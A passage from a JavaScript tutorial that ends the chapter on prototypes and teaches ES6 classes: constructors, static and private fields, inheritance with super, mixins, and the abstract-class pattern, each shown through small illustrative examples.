| Concept | Key Points |
|---------|------------|
| **`[[Prototype]]`** | Internal link; accessed via `__proto__` or `Object.getPrototypeOf()` |
| **Prototype Chain** | Property lookup walks up the chain |
| **`Object.create()`** | Create object with specified prototype |
| **`Object.setPrototypeOf()`** | Change prototype (performance cost) |
| **Property Shadowing** | Own properties shadow inherited ones |
| **`hasOwnProperty()`** | Check if property is own (not inherited) |

### Best Practices

1. **Prefer `class` syntax** for cleaner inheritance
2. **Use `Object.create(null)`** for dictionary objects
3. **Avoid modifying built-in prototypes**
4. **Use `Object.hasOwn()`** (ES2022) over `hasOwnProperty()`

---

**End of Chapter 5: Prototypes**

With prototypes understood, classes become a natural next step.


# 06-Classes.md

# 6 Classes

ES6 classes provide syntactic sugar over prototypal inheritance. They offer cleaner syntax for constructor functions, inheritance, static methods, and private fields.

---

## 6.1 Class Basics

Classes in JavaScript, introduced in ES6 (ES2015), provide a cleaner, more intuitive syntax for creating objects and implementing inheritance. They are syntactic sugar over JavaScript's existing prototype-based inheritance.

### Class Declarations

**Basic Class:**

```javascript
class Person {
  constructor(name, age) {
    this.name = name;
    this.age = age;
  }
  
  greet() {
    console.log(`Hello, I'm ${this.name} and I'm ${this.age} years old.`);
  }
  
  haveBirthday() {
    this.age++;
    console.log(`Happy birthday! You're now ${this.age}.`);
  }
}

const alice = new Person('Alice', 30);
alice.greet(); // "Hello, I'm Alice and I'm 30 years old."
```

### Class Expressions

```javascript
const Rectangle = class {
  constructor(width, height) {
    this.width = width;
    this.height = height;
  }
  
  getArea() {
    return this.width * this.height;
  }
};

const rect = new Rectangle(10, 5);
console.log(rect.getArea()); // 50
```

### Constructor Method

```javascript
class BankAccount {
  constructor(accountNumber, initialBalance = 0) {
    if (typeof accountNumber !== 'string' || accountNumber.length !== 10) {
      throw new Error('Account number must be a 10-character string');
    }
    if (initialBalance < 0) {
      throw new Error('Initial balance must be non-negative');
    }
    
    this.accountNumber = accountNumber;
    this.balance = initialBalance;
    this.transactions = [];
    this.createdAt = new Date();
  }
  
  deposit(amount) {
    if (amount <= 0) throw new Error('Amount must be positive');
    this.balance += amount;
    this.transactions.push({ type: 'deposit', amount, date: new Date() });
  }
}
```

### Instance Methods

```javascript
class Calculator {
  constructor(initialValue = 0) {
    this.value = initialValue;
  }
  
  add(num) {
    this.value += num;
    return this; // Enable method chaining
  }
  
  multiply(num) {
    this.value *= num;
    return this;
  }
  
  getResult() {
    return this.value;
  }
}

const result = new Calculator(10).add(5).multiply(2).getResult(); // 30
```

### Class Hoisting (Not Hoisted)

```javascript
// ERROR - Cannot access before declaration
// const obj = new MyClass(); // ReferenceError

class MyClass {
  constructor() {
    this.value = 42;
  }
}

// Now it works
const obj = new MyClass();
```

---


## 6.2 Class Features

### Static Methods

```javascript
class MathUtils {
  static add(a, b) {
    return a + b;
  }
  
  static factorial(n) {
    if (n <= 1) return 1;
    return n * MathUtils.factorial(n - 1);
  }
}

console.log(MathUtils.add(5, 3)); // 8
console.log(MathUtils.factorial(5)); // 120
```

**Static Factory Methods:**

```javascript
class User {
  constructor(name, email, role) {
    this.name = name;
    this.email = email;
    this.role = role;
  }
  
  static createAdmin(name, email) {
    return new User(name, email, 'admin');
  }
  
  static createGuest() {
    return new User('Guest', 'guest@example.com', 'guest');
  }
  
  static fromJSON(json) {
    const data = JSON.parse(json);
    return new User(data.name, data.email, data.role);
  }
}

const admin = User.createAdmin('Alice', 'alice@example.com');
const guest = User.createGuest();
```

### Static Properties

```javascript
class DatabaseConnection {
  static activeConnections = 0;
  static maxConnections = 10;
  static connections = [];
  
  constructor(database) {
    if (DatabaseConnection.activeConnections >= DatabaseConnection.maxConnections) {
      throw new Error('Maximum connections reached');
    }
    
    this.database = database;
    DatabaseConnection.activeConnections++;
    DatabaseConnection.connections.push(this);
  }
  
  disconnect() {
    DatabaseConnection.activeConnections--;
    const index = DatabaseConnection.connections.indexOf(this);
    if (index > -1) {
      DatabaseConnection.connections.splice(index, 1);
    }
  }
  
  static getStats() {
    return {
      active: this.activeConnections,
      max: this.maxConnections
    };
  }
}
```

### Instance Properties

```javascript
class Rectangle {
  width = 0;
  height = 0;
  color = 'black';
  
  constructor(width, height, color) {
    this.width = width;
    this.height = height;
    if (color) this.color = color;
  }
}
```

### Private Fields

```javascript
class BankAccount {
  #balance = 0;
  #pin;
  
  constructor(initialBalance, pin) {
    this.#balance = initialBalance;
    this.#pin = pin;
  }
  
  getBalance(pin) {
    if (pin !== this.#pin) {
      throw new Error('Invalid PIN');
    }
    return this.#balance;
  }
  
  deposit(amount, pin) {
    if (pin !== this.#pin) {
      throw new Error('Invalid PIN');
    }
    this.#balance += amount;
  }
  
  withdraw(amount, pin) {
    if (pin !== this.#pin) {
      throw new Error('Invalid PIN');
    }
    if (amount > this.#balance) {
      throw new Error('Insufficient funds');
    }
    this.#balance -= amount;
  }
}

const account = new BankAccount(1000, '1234');
console.log(account.getBalance('1234')); // 1000
// console.log(account.#balance); // SyntaxError
```

### Private Methods

```javascript
class PasswordManager {
  #passwords = new Map();
  #masterKey;
  
  constructor(masterPassword) {
    this.#masterKey = this.#deriveKey(masterPassword);
  }
  
  #deriveKey(password) {
    // Simplified key derivation
    let hash = 0;
    for (let i = 0; i < password.length; i++) {
      hash = ((hash << 5) - hash) + password.charCodeAt(i);
    }
    return Math.abs(hash).toString(16);
  }
  
  #encrypt(text) {
    // Simplified encryption
    return text.split('').reverse().join('') + '_encrypted';
  }
  
  #decrypt(encrypted) {
    return encrypted.replace('_encrypted', '').split('').reverse().join('');
  }
  
  addPassword(service, password) {
    const encrypted = this.#encrypt(password);
    this.#passwords.set(service, encrypted);
  }
  
  getPassword(service) {
    const encrypted = this.#passwords.get(service);
    if (!encrypted) throw new Error('Password not found');
    return this.#decrypt(encrypted);
  }
}
```

### Public Fields

```javascript
class Car {
  make = '';
  model = '';
  year = 0;
  features = [];
  
  constructor(make, model, year) {
    this.make = make;
    this.model = model;
    this.year = year;
  }
  
  addFeature(feature) {
    this.features.push(feature);
  }
}
```

### Static Blocks

```javascript
class Config {
  static apiUrl;
  static environment;
  
  static {
    const env = 'production';
    
    if (env === 'production') {
      this.apiUrl = 'https://api.production.com';
      this.environment = 'production';
    } else {
      this.apiUrl = 'https://api.dev.com';
      this.environment = 'development';
    }
  }
}

console.log(Config.apiUrl);
```

---


## 6.3 Inheritance

Class inheritance in JavaScript allows one class to extend another, inheriting its properties and methods while adding or overriding functionality.

### `extends` Keyword

The `extends` keyword is used to create a class that is a child of another class.

**Basic Inheritance:**

```javascript
// Parent class
class Animal {
  constructor(name) {
    this.name = name;
    this.energy = 100;
  }
  
  eat() {
    console.log(`${this.name} is eating`);
    this.energy += 10;
  }
  
  sleep() {
    console.log(`${this.name} is sleeping`);
    this.energy = 100;
  }
  
  makeSound() {
    console.log(`${this.name} makes a sound`);
  }
}

// Child class
class Dog extends Animal {
  constructor(name, breed) {
    super(name); // Call parent constructor
    this.breed = breed;
  }
  
  // Override parent method
  makeSound() {
    console.log(`${this.name} barks: Woof! Woof!`);
  }
  
  // Add new method
  fetch() {
    console.log(`${this.name} is fetching the ball`);
    this.energy -= 10;
  }
}

const dog = new Dog('Buddy', 'Golden Retriever');
dog.eat(); // "Buddy is eating" (inherited)
dog.makeSound(); // "Buddy barks: Woof! Woof!" (overridden)
dog.fetch(); // "Buddy is fetching the ball" (own method)

console.log(dog instanceof Dog); // true
console.log(dog instanceof Animal); // true
console.log(dog instanceof Object); // true
```

**Multiple Levels of Inheritance:**

```javascript
class LivingBeing {
  constructor(name) {
    this.name = name;
    this.isAlive = true;
  }
  
  breathe() {
    console.log(`${this.name} is breathing`);
  }
}

class Animal extends LivingBeing {
  constructor(name, species) {
    super(name);
    this.species = species;
  }
  
  move() {
    console.log(`${this.name} is moving`);
  }
}

class Mammal extends Animal {
  constructor(name, species, furColor) {
    super(name, species);
    this.furColor = furColor;
  }
  
  produceMilk() {
    console.log(`${this.name} is producing milk`);
  }
}

class Dog extends Mammal {
  constructor(name, breed, furColor) {
    super(name, 'Canine', furColor);
    this.breed = breed;
  }
  
  bark() {
    console.log(`${this.name} barks!`);
  }
}

const max = new Dog('Max', 'Labrador', 'Yellow');
max.breathe(); // From LivingBeing
max.move(); // From Animal
max.produceMilk(); // From Mammal
max.bark(); // From Dog

console.log(max.isAlive); // true (from LivingBeing)
console.log(max.species); // 'Canine' (from Animal)
console.log(max.furColor); // 'Yellow' (from Mammal)
console.log(max.breed); // 'Labrador' (from Dog)
```

**Extending Built-in Classes:**

```javascript
// Extend Array
class MyArray extends Array {
  first() {
    return this[0];
  }
  
  last() {
    return this[this.length - 1];
  }
  
  random() {
    return this[Math.floor(Math.random() * this.length)];
  }
  
  shuffle() {
    for (let i = this.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [this[i], this[j]] = [this[j], this[i]];
    }
    return this;
  }
}

const arr = new MyArray(1, 2, 3, 4, 5);
console.log(arr.first()); // 1
console.log(arr.last()); // 5
arr.push(6);
console.log(arr.length); // 6
console.log(arr.map(x => x * 2)); // [2, 4, 6, 8, 10, 12]

// Extend Map
class DefaultMap extends Map {
  constructor(defaultValue, entries) {
    super(entries);
    this.defaultValue = defaultValue;
  }
  
  get(key) {
    if (!this.has(key)) {
      return this.defaultValue;
    }
    return super.get(key);
  }
}

const map = new DefaultMap('N/A');
map.set('name', 'Alice');
console.log(map.get('name')); // 'Alice'
console.log(map.get('age')); // 'N/A' (default value)
```

### `super` Keyword (Constructor and Methods)

The `super` keyword is used to access and call functions on an object's parent class.

**`super` in Constructor:**

```javascript
class Vehicle {
  constructor(make, model, year) {
    this.make = make;
    this.model = model;
    this.year = year;
    this.mileage = 0;
  }
  
  getInfo() {
    return `${this.year} ${this.make} ${this.model}`;
  }
}

class Car extends Vehicle {
  constructor(make, model, year, doors) {
    // Must call super() before accessing 'this'
    super(make, model, year); // Call parent constructor
    
    // Now can use 'this'
    this.doors = doors;
    this.type = 'Car';
  }
  
  getFullInfo() {
    return `${this.getInfo()} - ${this.doors} doors`;
  }
}

const car = new Car('Toyota', 'Camry', 2024, 4);
console.log(car.getFullInfo()); // "2024 Toyota Camry - 4 doors"
```

**Rules for `super()` in Constructor:**

```javascript
class Parent {
  constructor(value) {
    this.value = value;
  }
}

class ChildCorrect extends Parent {
  constructor(value, extra) {
    // CORRECT: super() before using 'this'
    super(value);
    this.extra = extra;
  }
}

class ChildWrong extends Parent {
  constructor(value, extra) {
    // WRONG: Using 'this' before super()
    // this.extra = extra; // ReferenceError!
    // super(value);
  }
}

// If no constructor defined, super() is called automatically
class ChildAuto extends Parent {
  setExtra(extra) {
    this.extra = extra;
  }
}

const child = new ChildAuto(10);
child.setExtra(20);
console.log(child.value, child.extra); // 10 20
```

**`super` in Methods:**

```javascript
class Employee {
  constructor(name, salary) {
    this.name = name;
    this.salary = salary;
  }
  
  getAnnualBonus() {
    return this.salary * 0.1; // 10% bonus
  }
  
  getDetails() {
    return `Employee: ${this.name}, Salary: $${this.salary}`;
  }
}

class Manager extends Employee {
  constructor(name, salary, department) {
    super(name, salary);
    this.department = department;
    this.teamSize = 0;
  }
  
  // Override with super call
  getAnnualBonus() {
    const baseBonus = super.getAnnualBonus(); // Call parent method
    const managerBonus = this.teamSize * 1000; // Additional bonus
    return baseBonus + managerBonus;
  }
  
  // Extend parent method
  getDetails() {
    const baseDetails = super.getDetails(); // Call parent method
    return `${baseDetails}, Department: ${this.department}, Team: ${this.teamSize}`;
  }
  
  setTeamSize(size) {
    this.teamSize = size;
  }
}

const manager = new Manager('Alice', 80000, 'Engineering');
manager.setTeamSize(5);

console.log(manager.getAnnualBonus()); // 8000 + 5000 = 13000
console.log(manager.getDetails());
// "Employee: Alice, Salary: $80000, Department: Engineering, Team: 5"
```

**Complex `super` Usage:**

```javascript
class Shape {
  constructor(color) {
    this.color = color;
  }
  
  describe() {
    return `A ${this.color} shape`;
  }
  
  getArea() {
    return 0; // Default implementation
  }
}

class Rectangle extends Shape {
  constructor(color, width, height) {
    super(color);
    this.width = width;
    this.height = height;
  }
  
  describe() {
    const baseDescription = super.describe();
    return `${baseDescription} - specifically a rectangle`;
  }
  
  getArea() {
    return this.width * this.height;
  }
}

class Square extends Rectangle {
  constructor(color, side) {
    super(color, side, side); // Call Rectangle constructor
  }
  
  describe() {
    const parentDescription = super.describe();
    return `${parentDescription}, which is also a square`;
  }
  
  // Can call grandparent method
  getGrandparentDescription() {
    // Can't directly call Shape.describe(), but can through prototype
    return Shape.prototype.describe.call(this);
  }
}

const square = new Square('red', 5);
console.log(square.describe());
// "A red shape - specifically a rectangle, which is also a square"
console.log(square.getArea()); // 25
console.log(square.getGrandparentDescription()); // "A red shape"
```

### Method Overriding

Method overriding allows a child class to provide a specific implementation of a method already defined in its parent class.

**Complete Override:**

```javascript
class Animal {
  constructor(name) {
    this.name = name;
  }
  
  makeSound() {
    console.log(`${this.name} makes a generic sound`);
  }
  
  move() {
    console.log(`${this.name} moves`);
  }
}

class Dog extends Animal {
  makeSound() {
    console.log(`${this.name} barks: Woof!`);
  }
  
  move() {
    console.log(`${this.name} runs on four legs`);
  }
}

class Bird extends Animal {
  makeSound() {
    console.log(`${this.name} chirps: Tweet!`);
  }
  
  move() {
    console.log(`${this.name} flies in the sky`);
  }
}

const dog = new Dog('Buddy');
const bird = new Bird('Tweety');

dog.makeSound(); // "Buddy barks: Woof!"
dog.move(); // "Buddy runs on four legs"

bird.makeSound(); // "Tweety chirps: Tweet!"
bird.move(); // "Tweety flies in the sky"
```

**Partial Override (Extending Parent Functionality):**

```javascript
class BankAccount {
  constructor(accountNumber, balance = 0) {
    this.accountNumber = accountNumber;
    this.balance = balance;
    this.transactions = [];
  }
  
  deposit(amount) {
    this.balance += amount;
    this.transactions.push({ type: 'deposit', amount, date: new Date() });
    console.log(`Deposited $${amount}. New balance: $${this.balance}`);
  }
  
  withdraw(amount) {
    if (amount > this.balance) {
      console.log('Insufficient funds');
      return false;
    }
    this.balance -= amount;
    this.transactions.push({ type: 'withdrawal', amount, date: new Date() });
    console.log(`Withdrew $${amount}. New balance: $${this.balance}`);
    return true;
  }
  
  getTransactionHistory() {
    return this.transactions;
  }
}

class SavingsAccount extends BankAccount {
  constructor(accountNumber, balance, interestRate) {
    super(accountNumber, balance);
    this.interestRate = interestRate;
    this.withdrawalCount = 0;
    this.monthlyWithdrawalLimit = 6;
  }
  
  // Override with additional logic
  withdraw(amount) {
    if (this.withdrawalCount >= this.monthlyWithdrawalLimit) {
      console.log('Monthly withdrawal limit reached');
      return false;
    }
    
    // Call parent method
    const success = super.withdraw(amount);
    if (success) {
      this.withdrawalCount++;
      console.log(`Withdrawals remaining this month: ${this.monthlyWithdrawalLimit - this.withdrawalCount}`);
    }
    return success;
  }
  
  // Extend transaction history with interest
  getTransactionHistory() {
    const baseHistory = super.getTransactionHistory();
    const interestTransactions = baseHistory.filter(t => t.type === 'interest');
    return {
      all: baseHistory,
      interest: interestTransactions,
      totalInterestEarned: interestTransactions.reduce((sum, t) => sum + t.amount, 0)
    };
  }
  
  // New method specific to savings
  applyInterest() {
    const interest = this.balance * (this.interestRate / 100);
    this.balance += interest;
    this.transactions.push({ type: 'interest', amount: interest, date: new Date() });
    console.log(`Interest applied: $${interest.toFixed(2)}`);
  }
  
  resetMonthlyLimit() {
    this.withdrawalCount = 0;
  }
}

const savings = new SavingsAccount('SAV123', 1000, 2.5);
savings.deposit(500); // Uses parent implementation
savings.withdraw(100); // Uses overridden implementation
savings.applyInterest(); // New method
```

**Override Patterns:**

```javascript
class Product {
  constructor(name, price) {
    this.name = name;
    this.price = price;
  }
  
  getPrice() {
    return this.price;
  }
  
  getDetails() {
    return `${this.name}: $${this.price}`;
  }
  
  getTaxAmount() {
    return this.price * 0.1; // 10% tax
  }
}

class DiscountedProduct extends Product {
  constructor(name, price, discount) {
    super(name, price);
    this.discount = discount;
  }
  
  // Complete override - doesn't use super
  getPrice() {
    return this.price * (1 - this.discount / 100);
  }
  
  // Partial override - extends parent
  getDetails() {
    const parentDetails = super.getDetails();
    return `${parentDetails} (${this.discount}% off - Final: $${this.getPrice().toFixed(2)})`;
  }
  
  // Override to use the discounted price for tax
  getTaxAmount() {
    return this.getPrice() * 0.1;
  }
}

class PremiumProduct extends DiscountedProduct {
  constructor(name, price, discount, warranty) {
    super(name, price, discount);
    this.warranty = warranty;
  }
  
  // Override to add warranty info
  getDetails() {
    const parentDetails = super.getDetails();
    return `${parentDetails} + ${this.warranty}-year warranty`;
  }
}

const regular = new Product('Laptop', 1000);
console.log(regular.getDetails()); // "Laptop: $1000"

const discounted = new DiscountedProduct('Laptop', 1000, 20);
console.log(discounted.getDetails()); 
// "Laptop: $1000 (20% off - Final: $800.00)"

const premium = new PremiumProduct('Laptop', 1000, 20, 3);
console.log(premium.getDetails());
// "Laptop: $1000 (20% off - Final: $800.00) + 3-year warranty"
```

### `super` in Static Methods

The `super` keyword can be used in static methods to call static methods of the parent class.

**Basic Static `super`:**

```javascript
class Animal {
  static kingdom = 'Animalia';
  
  static getKingdom() {
    return this.kingdom;
  }
  
  static describe() {
    return 'This is an animal';
  }
  
  static classify() {
    return `Kingdom: ${this.getKingdom()}`;
  }
}

class Mammal extends Animal {
  static class = 'Mammalia';
  
  static describe() {
    const parentDescription = super.describe();
    return `${parentDescription}, specifically a mammal`;
  }
  
  static classify() {
    const parentClassification = super.classify();
    return `${parentClassification}, Class: ${this.class}`;
  }
  
  static getFullTaxonomy() {
    return {
      kingdom: super.getKingdom(),
      class: this.class,
      description: this.describe()
    };
  }
}

console.log(Mammal.describe());
// "This is an animal, specifically a mammal"

console.log(Mammal.classify());
// "Kingdom: Animalia, Class: Mammalia"

console.log(Mammal.getFullTaxonomy());
// { kingdom: 'Animalia', class: 'Mammalia', description: '...' }
```

**Static Methods with Inheritance Chain:**

```javascript
class Counter {
  static count = 0;
  
  static increment() {
    this.count++;
    return this.count;
  }
  
  static getCount() {
    return this.count;
  }
  
  static reset() {
    this.count = 0;
  }
  
  static display() {
    console.log(`Count: ${this.count}`);
  }
}

class DoubleCounter extends Counter {
  static increment() {
    super.increment();
    super.increment();
    return this.count;
  }
  
  static display() {
    console.log(`Double Counter: ${this.count}`);
  }
}

class TripleCounter extends DoubleCounter {
  static increment() {
    super.increment(); // Calls DoubleCounter.increment (which increments twice)
    super.increment(); // Calls again
    super.increment(); // Calls again
    return this.count;
  }
  
  static display() {
    super.display();
    console.log(`(Triple increment mode)`);
  }
}

console.log(DoubleCounter.increment()); // 2
console.log(DoubleCounter.increment()); // 4
DoubleCounter.display(); // "Double Counter: 4"

DoubleCounter.reset();
console.log(TripleCounter.increment()); // 6 (increments 6 times total)
TripleCounter.display();
// "Double Counter: 6"
// "(Triple increment mode)"
```

**Static Factory Methods with `super`:**

```javascript
class User {
  constructor(name, email) {
    this.name = name;
    this.email = email;
    this.role = 'user';
    this.createdAt = new Date();
  }
  
  static fromJSON(json) {
    const data = JSON.parse(json);
    return new this(data.name, data.email);
  }
  
  static createGuest() {
    return new this('Guest', 'guest@example.com');
  }
  
  static createBatch(users) {
    return users.map(user => new this(user.name, user.email));
  }
}

class Admin extends User {
  constructor(name, email, permissions) {
    super(name, email);
    this.role = 'admin';
    this.permissions = permissions || ['read', 'write', 'delete'];
  }
  
  static fromJSON(json) {
    const user = super.fromJSON(json);
    const data = JSON.parse(json);
    return new this(user.name, user.email, data.permissions);
  }
  
  static createSuperAdmin() {
    const guest = super.createGuest();
    return new this(guest.name, guest.email, ['all']);
  }
  
  static createBatch(admins) {
    return admins.map(admin => 
      new this(admin.name, admin.email, admin.permissions)
    );
  }
}

const admin = Admin.fromJSON('{"name":"Alice","email":"alice@example.com","permissions":["read","write"]}');
console.log(admin.role); // 'admin'
console.log(admin.permissions); // ['read', 'write']

const superAdmin = Admin.createSuperAdmin();
console.log(superAdmin.permissions); // ['all']

const admins = Admin.createBatch([
  { name: 'Bob', email: 'bob@example.com', permissions: ['read'] },
  { name: 'Charlie', email: 'charlie@example.com', permissions: ['read', 'write'] }
]);
console.log(admins.length); // 2
```

### Inheritance Chains

Complex inheritance hierarchies where classes extend other classes in a chain.

**Multi-Level Inheritance:**

```javascript
class Vehicle {
  constructor(make, model) {
    this.make = make;
    this.model = model;
    this.speed = 0;
  }
  
  accelerate(amount) {
    this.speed += amount;
    console.log(`Accelerating to ${this.speed} mph`);
  }
  
  brake(amount) {
    this.speed = Math.max(0, this.speed - amount);
    console.log(`Braking to ${this.speed} mph`);
  }
}

class MotorVehicle extends Vehicle {
  constructor(make, model, engineType) {
    super(make, model);
    this.engineType = engineType;
    this.fuelLevel = 100;
  }
  
  accelerate(amount) {
    if (this.fuelLevel > 0) {
      super.accelerate(amount);
      this.fuelLevel -= amount * 0.1;
    } else {
      console.log('Out of fuel!');
    }
  }
  
  refuel() {
    this.fuelLevel = 100;
    console.log('Tank refilled');
  }
}

class Car extends MotorVehicle {
  constructor(make, model, engineType, doors) {
    super(make, model, engineType);
    this.doors = doors;
  }
  
  openTrunk() {
    console.log('Trunk opened');
  }
}

class ElectricCar extends Car {
  constructor(make, model, doors, batteryCapacity) {
    super(make, model, 'Electric', doors);
    this.batteryCapacity = batteryCapacity;
    this.batteryLevel = 100;
  }
  
  accelerate(amount) {
    if (this.batteryLevel > 0) {
      this.speed += amount;
      this.batteryLevel -= amount * 0.05;
      console.log(`Silently accelerating to ${this.speed} mph (Battery: ${this.batteryLevel.toFixed(1)}%)`);
    } else {
      console.log('Battery depleted!');
    }
  }
  
  charge() {
    this.batteryLevel = 100;
    console.log('Battery fully charged');
  }
  
  // Override refuel (electric cars don't use fuel)
  refuel() {
    console.log('This is an electric car. Use charge() instead.');
  }
}

const tesla = new ElectricCar('Tesla', 'Model 3', 4, 75);
tesla.accelerate(20);
tesla.brake(10);
tesla.openTrunk();
tesla.charge();

// Verify inheritance chain
console.log(tesla instanceof ElectricCar); // true
console.log(tesla instanceof Car); // true
console.log(tesla instanceof MotorVehicle); // true
console.log(tesla instanceof Vehicle); // true
```

**Traversing the Inheritance Chain:**

```javascript
class A {
  methodA() { return 'A'; }
  commonMethod() { return 'A version'; }
}

class B extends A {
  methodB() { return 'B'; }
  commonMethod() { return 'B version'; }
}

class C extends B {
  methodC() { return 'C'; }
  commonMethod() { return 'C version'; }
}

class D extends C {
  methodD() { return 'D'; }
  // Doesn't override commonMethod
}

const d = new D();

// All methods are accessible
console.log(d.methodA()); // 'A'
console.log(d.methodB()); // 'B'
console.log(d.methodC()); // 'C'
console.log(d.methodD()); // 'D'
console.log(d.commonMethod()); // 'C version' (from C, not overridden in D)

// Get prototype chain
function getPrototypeChain(obj) {
  const chain = [];
  let current = obj;
  
  while (current) {
    chain.push(current.constructor.name);
    current = Object.getPrototypeOf(current);
    if (current === Object.prototype) break;
  }
  
  return chain;
}

console.log(getPrototypeChain(d)); // ['D', 'C', 'B', 'A']

// Check if method exists in chain
function hasMethodInChain(obj, methodName) {
  let current = obj;
  while (current) {
    if (current.hasOwnProperty(methodName)) {
      return {
        found: true,
        owner: current.constructor.name
      };
    }
    current = Object.getPrototypeOf(current);
    if (current === Object.prototype) break;
  }
  return { found: false };
}

console.log(hasMethodInChain(d, 'methodA')); // { found: true, owner: 'A' }
```

**Complex Real-World Example:**

```javascript
// Database ORM-like inheritance chain
class Model {
  constructor(data = {}) {
    this.data = data;
    this.errors = [];
  }
  
  validate() {
    this.errors = [];
    return this.errors.length === 0;
  }
  
  save() {
    if (this.validate()) {
      console.log('Saving to database...');
      return true;
    }
    console.log('Validation failed:', this.errors);
    return false;
  }
}

class TimestampedModel extends Model {
  constructor(data = {}) {
    super(data);
    this.data.createdAt = this.data.createdAt || new Date();
    this.data.updatedAt = new Date();
  }
  
  save() {
    this.data.updatedAt = new Date();
    return super.save();
  }
}

class SoftDeletableModel extends TimestampedModel {
  constructor(data = {}) {
    super(data);
    this.data.deletedAt = this.data.deletedAt || null;
  }
  
  delete() {
    this.data.deletedAt = new Date();
    return this.save();
  }
  
  restore() {
    this.data.deletedAt = null;
    return this.save();
  }
  
  save() {
    // Only save if not deleted
    if (this.data.deletedAt) {
      console.log('Cannot save deleted record');
      return false;
    }
    return super.save();
  }
}

class User extends SoftDeletableModel {
  constructor(data = {}) {
    super(data);
    if (!this.data.role) {
      this.data.role = 'user';
    }
  }
  
  validate() {
    super.validate();
    
    if (!this.data.email) {
      this.errors.push('Email is required');
    }
    if (!this.data.name) {
      this.errors.push('Name is required');
    }
    
    return this.errors.length === 0;
  }
  
  isAdmin() {
    return this.data.role === 'admin';
  }
}

// Usage
const user = new User({ name: 'Alice', email: 'alice@example.com' });
user.save(); // Validates, adds timestamps, saves
user.delete(); // Soft deletes
user.restore(); // Restores

// Inheritance chain: User â†’ SoftDeletableModel â†’ TimestampedModel â†’ Model
```

---


## 6.4 Class Patterns

Advanced patterns and techniques for working with classes in JavaScript.

### Mixins

Mixins allow you to add functionality to classes without using inheritance. They're useful for sharing behavior between unrelated classes.

**Object-Based Mixin:**

```javascript
// Mixin as an object
const TimestampMixin = {
  setTimestamp() {
    this.createdAt = new Date();
  },
  
  updateTimestamp() {
    this.updatedAt = new Date();
  },
  
  getAge() {
    return new Date() - this.createdAt;
  }
};

// Apply mixin to a class
class User {
  constructor(name) {
    this.name = name;
  }
}

Object.assign(User.prototype, TimestampMixin);

const user = new User('Alice');
user.setTimestamp();
console.log(user.createdAt); // Current date
```

**Function-Based Mixin (More Powerful):**

```javascript
// Mixin as a function that extends a base class
function withLogging(Base) {
  return class extends Base {
    log(message) {
      console.log(`[${this.constructor.name}] ${message}`);
    }
    
    logMethod(methodName, ...args) {
      console.log(`[${this.constructor.name}.${methodName}] Called with:`, args);
    }
  };
}

function withValidation(Base) {
  return class extends Base {
    validate(data, rules) {
      const errors = [];
      for (const [field, rule] of Object.entries(rules)) {
        if (rule.required && !data[field]) {
          errors.push(`${field} is required`);
        }
        if (rule.minLength && data[field].length < rule.minLength) {
          errors.push(`${field} must be at least ${rule.minLength} characters`);
        }
      }
      return errors;
    }
  };
}

function withSerialization(Base) {
  return class extends Base {
    toJSON() {
      return JSON.stringify(this);
    }
    
    static fromJSON(json) {
      const data = JSON.parse(json);
      return new this(data);
    }
  };
}

// Base class
class Entity {
  constructor(id) {
    this.id = id;
  }
}

// Apply multiple mixins
class User extends withSerialization(withValidation(withLogging(Entity))) {
  constructor(id, name, email) {
    super(id);
    this.logMethod('constructor', id, name, email);
    
    const errors = this.validate({ name, email }, {
      name: { required: true, minLength: 2 },
      email: { required: true }
    });
    
    if (errors.length > 0) {
      throw new Error(errors.join(', '));
    }
    
    this.name = name;
    this.email = email;
  }
  
  save() {
    this.log('Saving user...');
    // Save logic
  }
}

const user = new User(1, 'Alice', 'alice@example.com');
user.save(); // Uses logging mixin
```

**Multiple Mixins Pattern:**

```javascript
// Define mixins
const Flyable = (Base) => class extends Base {
  fly() {
    console.log(`${this.name} is flying`);
  }
};

const Swimmable = (Base) => class extends Base {
  swim() {
    console.log(`${this.name} is swimming`);
  }
};

const Walkable = (Base) => class extends Base {
  walk() {
    console.log(`${this.name} is walking`);
  }
};

// Base class
class Animal {
  constructor(name) {
    this.name = name;
  }
}

// Compose different combinations
class Duck extends Swimmable(Flyable(Walkable(Animal))) {
  quack() {
    console.log(`${this.name} says: Quack!`);
  }
}

class Fish extends Swimmable(Animal) {
  // Only swims
}

class Bird extends Flyable(Walkable(Animal)) {
  // Flies and walks
}

const duck = new Duck('Donald');
duck.walk(); // "Donald is walking"
duck.swim(); // "Donald is swimming"
duck.fly(); // "Donald is flying"
duck.quack(); // "Donald says: Quack!"

const fish = new Fish('Nemo');
fish.swim(); // "Nemo is swimming"
// fish.fly(); // Error - no fly method
```

**Practical Mixin Example:**

```javascript
// Event emitter mixin
const EventEmitter = (Base) => class extends Base {
  constructor(...args) {
    super(...args);
    this._events = {};
  }
  
  on(event, handler) {
    if (!this._events[event]) {
      this._events[event] = [];
    }
    this._events[event].push(handler);
  }
  
  emit(event, data) {
    if (this._events[event]) {
      this._events[event].forEach(handler => handler(data));
    }
  }
  
  off(event, handler) {
    if (this._events[event]) {
      this._events[event] = this._events[event].filter(h => h !== handler);
    }
  }
};

// Observable state mixin
const Observable = (Base) => class extends Base {
  constructor(...args) {
    super(...args);
    this._state = {};
  }
  
  setState(newState) {
    const oldState = { ...this._state };
    this._state = { ...this._state, ...newState };
    this.emit('stateChange', { oldState, newState: this._state });
  }
  
  getState() {
    return { ...this._state };
  }
};

// Combine mixins
class Store extends Observable(EventEmitter(class {})) {
  constructor(initialState = {}) {
    super();
    this._state = initialState;
  }
  
  dispatch(action) {
    this.emit('action', action);
    // Handle action and update state
    this.setState({ lastAction: action.type });
  }
}

const store = new Store({ count: 0 });

store.on('stateChange', ({ oldState, newState }) => {
  console.log('State changed:', oldState, '->', newState);
});

store.on('action', (action) => {
  console.log('Action dispatched:', action);
});

store.dispatch({ type: 'INCREMENT' });
// Logs: "Action dispatched: { type: 'INCREMENT' }"
// Logs: "State changed: {...} -> {...}"
```

### Abstract Classes (Pattern)

JavaScript doesn't have built-in abstract classes, but we can implement the pattern.

**Basic Abstract Class:**

```javascript
class AbstractShape {
  constructor() {
    if (new.target === AbstractShape) {
      throw new Error('Cannot instantiate abstract class AbstractShape');
    }
  }
  
  // Abstract methods (must be implemented by subclasses)
  getArea() {
    throw new Error('Method getArea() must be implemented');
  }
  
  getPerimeter() {
    throw new Error('Method getPerimeter() must be implemented');
  }
  
  // Concrete method (can be used by all subclasses)
  describe() {
    return `This shape has an area of ${this.getArea()} and perimeter of ${this.getPerimeter()}`;
  }
}

class Circle extends AbstractShape {
  constructor(radius) {
    super();
    this.radius = radius;
  }
  
  getArea() {
